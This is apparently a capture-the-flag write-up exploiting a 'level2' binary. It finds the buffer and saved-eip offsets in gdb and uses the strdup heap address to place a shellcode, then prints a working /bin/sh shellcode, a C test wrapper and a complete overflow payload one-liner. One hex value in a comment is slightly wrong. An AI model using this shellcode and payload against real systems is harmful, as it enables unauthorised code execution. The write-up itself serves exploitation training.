In the code, we can see that there is a call to `gets` and `strdup`. Moreover, we want to not be caught by the `if`. We could use a shell code to execute a shell,
store it in the buffer that will be copied with the `strdup` and do a buffer overflow to set `eip` to the address of our copy of our shell code.

## Investigation

1) We need to know where our buffer is written. We will give `aaaa` as input, print the stack and see where the value `0x61616161` is.
    ```
    (gdb) x/12xw $esp
    0xbffff6b0:     0xbffff6cc      0x00000000      0x00000000      0xb7e5ec73
    0xbffff6c0:     0x080482b5      0x00000000      0x00000000      0x61616161
    0xbffff6d0:     0xbffff800      0x0000002f      0xbffff72c      0xb7fd0ff4
    ```
    We can see that our buffer is written at `0xbffff6cc`. 

2) Now we need to know where `eip` is saved.
    ```
    (gdb) i f
    Stack level 0, frame at 0xbffff720:
     ...
     Saved registers:
      ebp at 0xbffff718, eip at 0xbffff71c
    ```
    `eip` is saved at `0xbffff71c` we can then calculate the offset between our buffer and `eip`, `0xbffff71c - 0xbffff6cc = 0x50 = 0d80`.

3) Finally, we need to know where `strdup` is going to save the copy of our buffer.
     ```bash
     $ ltrace ./level2
     ...
     strdup("oui")                                                             = 0x0804a008
     ...
     ```
     `strdup` store his value at `0x0804a008`.

## Exploit

We will use the shell code `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`, it's execute this
```c
int main() {
  char sc[] = "\x6a\x0b" // push byte +0xb
  "\x58" // pop eax
  "\x99" // cdq
  "\x52" // push edx
  "\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f
  "\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f
  "\x89\xe3" // mov ebx, esp
  "\x31\xc9" // xor ecx, ecx
  "\xcd\x80"; // int 0x80
   
  ((void (*)()) sc)();
}
```
It has a length of 21 characters, therefore it will be necessary to fill `80 - 21 = 59` characters to rewrite `eip`.

Our payload will be like `"<shell code>" + "a"*<offset - shell code length> + "<strdup address>"`.
In our case, the payload becomes: `"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a"*59 + "\x08\xa0\x04\x08"`

```shell
(cat <(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a"*59 + "\x08\xa0\x04\x08"') -) | ./level2
```
